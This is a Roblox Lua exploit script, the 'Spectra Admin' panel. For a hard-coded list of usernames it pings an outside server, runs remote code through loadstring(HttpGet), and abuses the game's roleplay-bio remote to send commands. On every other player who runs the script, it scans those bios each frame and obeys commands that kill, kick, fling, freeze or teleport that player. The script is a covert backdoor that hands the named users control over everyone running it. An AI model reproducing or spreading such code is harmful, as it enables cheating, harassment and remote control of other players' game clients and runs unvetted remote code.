local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")

local LocalPlayer = Players.LocalPlayer

local Owners = {}
local Admins = {
    "udydydi2usy6d6d",
    "Denolk_new",
    "BaneSlimeBacon",
    "matheus_gondimr",
    "BallerLives3",
    "AlvaradoJustin2",
    "itz_pedro7229"
}

local function GetPlayerRole(playerName)
    for _, name in ipairs(Owners) do
        if name == playerName then return "Owner" end
    end
    for _, name in ipairs(Admins) do
        if name == playerName then return "Admin" end
    end
    return nil
end

local IsWhitelisted = GetPlayerRole(LocalPlayer.Name) ~= nil

local function SetTemporaryBio(text)
    local RE = ReplicatedStorage:FindFirstChild("RE")
    if RE then
        local Remote = RE:FindFirstChild("1RPNam1eTex1t")
        if Remote then
            Remote:FireServer("RolePlayBio", text)
            task.delay(3, function()
                Remote:FireServer("RolePlayBio", "")
            end)
        end
    end
end

local WindUI = nil
if IsWhitelisted then
    pcall(function()
        game:HttpGet("https://nexviewsservice.shardweb.app/services/stelarium_hub/start")
    end)
    local success, result = pcall(function()
        return loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
    end)
    if success then WindUI = result end
end

if IsWhitelisted and WindUI then
    local Window = WindUI:CreateWindow({
        Title = "Spectra_Admin",
        Icon = "rbxassetid://16917184359",
        Author = "Dev do Painel: Denolk",
        Folder = "StelariumXS",
        Size = UDim2.fromOffset(330, 240),  
        Transparent = true,  
        Theme = "Dark",  
        Resizable = true,  
        SideBarWidth = 200,  
        HideSearchBar = true,  
        ScrollBarEnabled = false,  
        HasOutline = false,  
        Background = "rbxassetid://9896226010",  
        BackgroundImageTransparency = 0.10
    })

    local SelectedPlayer = nil

    local function GetPlayerNames()
        local list = {}
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer then
                table.insert(list, plr.Name)
            end
        end
        return list
    end

    local Tab = Window:Tab({
        Title = "Comandos",
        Icon = "terminal"
    })

    local CommandSection = Tab:Section({
        Title = "Comandos Spectra",
        Icon = "user-cog",
        Opened = true
    })

    local PlayerDropdown = CommandSection:Dropdown({
        Title = "Selecionar Jogador",
        Values = GetPlayerNames(),
        Callback = function(value)
            SelectedPlayer = value
        end
    })

    local function RefreshPlayers()
        PlayerDropdown:Refresh(GetPlayerNames())
    end

    Players.PlayerAdded:Connect(RefreshPlayers)
    Players.PlayerRemoving:Connect(RefreshPlayers)

    local function CmdButton(title, cmd)
        CommandSection:Button({
            Title = title,
            Callback = function()
                if SelectedPlayer then
                    SetTemporaryBio(cmd .. " " .. SelectedPlayer)
                end
            end
        })
    end

    CmdButton("Kill", ";kill")
    CmdButton("KillPlus", ";killplus")
    CmdButton("Fling", ";fling")
    CmdButton("Fling OP", ";flingop")
    CmdButton("Jail", ";jail")
    CmdButton("Unjail", ";unjail")
    CmdButton("Frozen", ";frozen")
    CmdButton("Unfrozen", ";unfrozen")
    CmdButton("Poison", ";poison")
    CmdButton("Sit", ";sit")
    CmdButton("Kick", ";kick")
    CmdButton("Bomb", ";bomb")
    CmdButton("Float", ";float")
    CmdButton("Backrooms", ";backrooms")

    CommandSection:Button({
        Title = "Verifique",
        Callback = function()
            SetTemporaryBio("Spectra_####")
        end
    })
end

local function Char() return LocalPlayer.Character end
local function Humanoid() local c = Char() return c and c:FindFirstChild("Humanoid") end
local function HRP() local c = Char() return c and c:FindFirstChild("HumanoidRootPart") end

local JailModel = nil
local function RemoveJail()
    if JailModel then
        JailModel:Destroy()
        JailModel = nil
    end
end

local Floating = false
local FloatConn
local function StartFloat()
    if Floating then return end
    local hum = Humanoid()
    if not hum then return end
    Floating = true
    hum.WalkSpeed, hum.JumpPower = 0, 0
    FloatConn = RunService.Heartbeat:Connect(function()  
        local root = HRP()
        if root then root.AssemblyLinearVelocity = Vector3.new(0, 20, 0) end
    end)
end

LocalPlayer.CharacterAdded:Connect(function()
    Floating = false
    if FloatConn then FloatConn:Disconnect() FloatConn = nil end
end)

local Frozen = false
local OldWalkSpeed, OldJumpPower = 16, 50

local Actions = {
    [";kill"] = function() local h = Humanoid() if h then h.Health = 0 end end,
    [";fling"] = function() local r = HRP() if r then r.Velocity = Vector3.new(6000, 300, 6000) end end,
    [";flingop"] = function() local r = HRP() if r then r.Velocity = Vector3.new(0, 150000, 0) end end,
    [";jail"] = function()
        if JailModel then return end
        local root = HRP()
        if not root then return end
        JailModel = Instance.new("Model", Workspace)
        JailModel.Name = "SpectraJail"
        local base = root.CFrame
        local function wall(size, offset)
            local p = Instance.new("Part", JailModel)
            p.Anchored, p.CanCollide, p.Size = true, true, size
            p.Transparency, p.Material, p.Color = 0.4, Enum.Material.ForceField, Color3.fromRGB(255,0,0)
            p.CFrame = base * offset
        end
        wall(Vector3.new(18,12,1), CFrame.new(0,0,9))
        wall(Vector3.new(18,12,1), CFrame.new(0,0,-9))
        wall(Vector3.new(1,12,18), CFrame.new(9,0,0))
        wall(Vector3.new(1,12,18), CFrame.new(-9,0,0))
        wall(Vector3.new(18,1,18), CFrame.new(0,-6,0))
        wall(Vector3.new(18,1,18), CFrame.new(0,6,0))
    end,
    [";unjail"] = RemoveJail,
    [";kick"] = function() LocalPlayer:Kick("Você foi expulso por um user do Spectra Admin") end,
    [";sit"] = function() local h = Humanoid() if h then h.Sit = true end end,
    [";poison"] = function()
        local h = Humanoid()
        if h then
            task.spawn(function()
                for i = 1, 20 do
                    if h.Health <= 0 then break end
                    h.Health = h.Health - 3
                    task.wait(0.5)
                end
            end)
        end
    end,
    [";killplus"] = function()
        local root, hum = HRP(), Humanoid()
        if root and hum then
            for i = 1, 45 do
                local p = Instance.new("Part", Workspace)
                p.Size, p.Material, p.CFrame = Vector3.new(0.6,0.6,0.6), Enum.Material.Neon, root.CFrame
                p.Color = Color3.fromHSV(math.random(), 1, 1)
                p.AssemblyLinearVelocity = Vector3.new(math.random(-35,35), math.random(20,45), math.random(-35,35))
                game:GetService("Debris"):AddItem(p, 2.5)
            end
            hum.Health = 0
        end
    end,
    [";frozen"] = function()
        local h, r = Humanoid(), HRP()
        if h and r and not Frozen then
            Frozen, OldWalkSpeed, OldJumpPower = true, h.WalkSpeed, h.JumpPower
            h.WalkSpeed, h.JumpPower, h.AutoRotate, r.Anchored = 0, 0, false, true
        end
    end,
    [";unfrozen"] = function()
        local h, r = Humanoid(), HRP()
        if h and r and Frozen then
            Frozen = false
            h.WalkSpeed, h.JumpPower, h.AutoRotate, r.Anchored = OldWalkSpeed, OldJumpPower, true, false
        end
    end,
    [";bomb"] = function()
        local r, h = HRP(), Humanoid()
        if r then
            local e = Instance.new("Explosion", Workspace)
            e.Position, e.BlastRadius = r.Position, 20
            if h then h.Health = 0 end
        end
    end,
    [";float"] = StartFloat,
    [";backrooms"] = function()
        local r = HRP()
        if r then
            local success, mapa = pcall(function() return game:GetObjects("rbxassetid://10581711055")[1] end)
            if success and mapa then
                mapa.Parent = Workspace
                mapa:SetPrimaryPartCFrame(CFrame.new(0, 10000, 0))
            end
            r.CFrame = CFrame.new(59, 9996, 19)
        end
    end
}

local function ScanBios()
    for _, player in ipairs(Players:GetPlayers()) do
        if GetPlayerRole(player.Name) then 
            local char = player.Character
            if char then
                local head = char:FindFirstChild("Head")
                local overHead = head and head:FindFirstChild("Nametag") 
                if overHead then
                    local bioLabel = overHead:FindFirstChild("RolePlayBio") 
                    if bioLabel and bioLabel:IsA("TextLabel") then
                        local bioText = string.lower(bioLabel.Text)
                        local myName = string.lower(LocalPlayer.Name)

                        for cmd, action in pairs(Actions) do
                            if bioText == cmd .. " " .. myName then
                                action()
                            end
                        end

                        if bioText == ";verifique" then
                            SetTemporaryBio("Spectra_####")
                        end
                    end
                end
            end
        end
    end
end

RunService.Heartbeat:Connect(ScanBios)

if IsWhitelisted then
    local function criarTag(head, role)
        for _, existing in ipairs(head:GetChildren()) do
            if existing.Name == "SpectraTag" then existing:Destroy() end
        end
        local gui = Instance.new("BillboardGui", head)
        gui.Name, gui.Size, gui.StudsOffset, gui.AlwaysOnTop = "SpectraTag", UDim2.new(0, 150, 0, 36), Vector3.new(0, 2.8, 0), true
        local frame = Instance.new("Frame", gui)
        frame.Size, frame.BackgroundColor3, frame.BackgroundTransparency = UDim2.new(1,0,1,0), Color3.fromRGB(0,0,0), 0.25
        Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 14)
        local stroke = Instance.new("UIStroke", frame)
        stroke.Thickness = 2
        local txt = Instance.new("TextLabel", frame)
        txt.Size, txt.BackgroundTransparency, txt.TextScaled, txt.Font = UDim2.new(1,0,1,0), 1, true, Enum.Font.GothamBold
        if role == "Owner" then
            stroke.Color, txt.Text, txt.TextColor3 = Color3.fromRGB(255,0,0), "Dono Spectra", Color3.fromRGB(255,200,200)
        elseif role == "Admin" then
            stroke.Color, txt.Text, txt.TextColor3 = Color3.fromRGB(0,100,255), "Admin Spectra", Color3.fromRGB(200,200,255)
        end
    end

    local function aplicarTagAoJogador(player)
        local role = GetPlayerRole(player.Name)
        if not role then return end
        local function apply(char)
            local head = char:WaitForChild("Head", 10)
            if head then criarTag(head, role) end
        end
        if player.Character then apply(player.Character) end
        player.CharacterAdded:Connect(apply)
    end

    for _, player in ipairs(Players:GetPlayers()) do task.spawn(function() aplicarTagAoJogador(player) end) end
    Players.PlayerAdded:Connect(aplicarTagAoJogador)
end
